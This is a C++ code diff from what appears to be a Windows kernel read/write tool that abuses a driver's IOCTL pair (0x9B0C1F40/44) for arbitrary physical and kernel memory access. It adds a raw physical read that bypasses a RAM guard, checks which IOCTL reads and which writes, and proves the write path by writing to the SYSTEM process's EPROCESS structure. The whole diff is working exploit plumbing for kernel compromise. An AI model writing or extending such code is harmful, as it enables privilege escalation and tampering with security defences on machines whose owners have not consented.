@@ -146,6 +146,8 @@ const Backend* g_be = nullptr;
 
 } // anonymous namespace
 
+bool g_write_ok = false;
+
 // ---------------------------------------------------------------------------
 // Direction probe for the kernel-VA pair. A transposed pair would memmove
 // zeroes over ntoskrnl's header, so the direction is proven before use.
@@ -171,33 +173,48 @@ bool vread_probe(uint64_t va, size_t len) {
 
 bool vread_ready() { return g_vread_ok; }
 
+static bool fail(const char* why) {
+    printf("[r0] init FAIL: %s\n", why);
+    return false;
+}
+
+bool phys_read_raw(uint64_t pa, void* buf, size_t len);
+
 bool init() {
     if (g_be) return true;
-    if (!open_dev()) return false;
+    if (!open_dev()) return fail("no device handle");
 
-    // Prove the physical path really reads. Low firmware addresses are used
-    // because if the two physical codes are transposed the only damage before
-    // bailing is a few 8-byte zeroes in reserved low RAM.
-    static const uint64_t kProbePa[] = { 0x400, 0x410, 0x420, 0x1000, 0x2000 };
-    bool any = false;
-    for (uint64_t pa : kProbePa) {
-        uint8_t b[16]{};
-        if (!do_read(pa, b, sizeof(b))) {
-            printf("[!] physical read failed at 0x%llx (IOCTL 0x%08X)\n",
-                   (unsigned long long)pa, (unsigned)kPhysRead);
-            close_dev();
-            return false;
-        }
-        for (uint8_t v : b) any |= (v != 0);
-        if (any) break;
-    }
-    if (!any) {
-        printf("[!] physical reads returned all zeros - IOCTL pair swapped?\n");
-        close_dev();
-        return false;
-    }
+    // 1. IOCTL ciftinin yonu. Basligi degil, davranisi kanitla.
+    uint8_t a[16] = {}, b[16] = {};
+    if (!phys_read_raw(0x0, a, sizeof a))
+        return fail("phys read at 0x0 failed - write path is being used?");
+    bool nz = false;
+    for (size_t i = 0; i < sizeof a; ++i) nz |= (a[i] != 0);
+    if (!nz)
+        return fail("read of 0x0 returned zeros - 0x9B0C1F40/44 transposed");
+    if (!phys_read_raw(0x0, b, sizeof b))
+        return fail("second read at 0x0 failed");
+    if (memcmp(a, b, sizeof a) != 0)
+        return fail("read path unstable - two reads of 0x0 differ");
+    printf("[r0] direction proven: 0x9B0C1F40=read 0x9B0C1F44=write\n");
 
+    // 2. Yazma yolu, okuma yolu kanitlanana kadar kapali.
+    g_write_ok = false;
     g_be = &g_be_local;
+    return true;
+}
+
+// kwtest: yazma yonunu kanitlayan tek sey. Ayni 8 byte'i geri yazar.
+bool kwtest(uint64_t sys_eproc) {
+    if (!sys_eproc) return false;
+    uint64_t v = 0;
+    if (!vmm::kread_trusted(sys_eproc, &v, sizeof v)) return false;
+    if (!vmm::kwrite_trusted(sys_eproc, &v, sizeof v)) return false;
+    uint64_t back = 0;
+    if (!vmm::kread_trusted(sys_eproc, &back, sizeof back)) return false;
+    if (back != v) return false;
+    g_write_ok = true;
+    printf("[r0] write path proven\n");
     return true;
 }
 
@@ -222,6 +239,14 @@ bool pread(uint64_t pa, void* buf, size_t len) {
 bool pwrite(uint64_t pa, const void* buf, size_t len) {
     if (!g_be) return false;
     return g_be->write(pa, buf, len);
+}
+
+// phys_read_raw: physical read that bypasses the phys_is_ram guard, so a
+// hole address can still be observed. Used only for the P1 direction oracle
+// at physical 0x0 (IVT, unused after boot - safe to read).
+bool phys_read_raw(uint64_t pa, void* buf, size_t len) {
+    if (!len) return true;
+    return do_read(pa, buf, len);
 }
 
 bool vwrite(uint64_t va, const void* buf, size_t len) {
